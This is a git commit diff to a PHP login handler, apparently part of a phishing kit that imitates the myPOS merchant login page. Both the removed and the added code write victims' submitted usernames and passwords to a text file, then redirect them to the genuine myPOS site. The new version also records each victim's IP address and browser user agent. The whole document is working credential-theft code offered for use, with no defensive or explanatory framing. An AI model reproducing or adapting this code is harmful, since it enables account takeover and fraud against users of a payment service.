49d40ea52f56c99712078fa710f6c83a785b8783
cerozzo90 <cerozzotattoo90@gmail.com>
2025-07-26 22:42:54 +0200

    sites

--- .sites/Mypos/login.php
+++ .sites/Mypos/login.php
@@ -1,6 +1,18 @@
-<?php
-
-file_put_contents("usernames.txt", "Linkedin Username: " . $_POST['session_key'] . " Pass: " . $_POST['session_password'] . "\n", FILE_APPEND);
-header('Location:https://merchant.mypos.com/it/login ');
+<?php 
+ 
+if (!empty($_SERVER['HTTP_CLIENT_IP'])) 
+    { 
+      $ipaddress = $_SERVER['HTTP_CLIENT_IP']; 
+    } 
+elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) 
+    { 
+      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']; 
+    } 
+else 
+    { 
+      $ipaddress = $_SERVER['REMOTE_ADDR']; 
+    } 
+$browser = $_SERVER['HTTP_USER_AGENT']."\r\n"; 
+file_put_contents("usernames.txt", "\nUser-Agent: " . $browser . "IP: " . $ipaddress . "\nAccount: \"" . $_POST['session_key'] . "\" Pass: \"" . $_POST['session_password'] . "\"\n", FILE_APPEND);
+header('Location: https://merchant.mypos.com/it/login');
 exit();
-?>
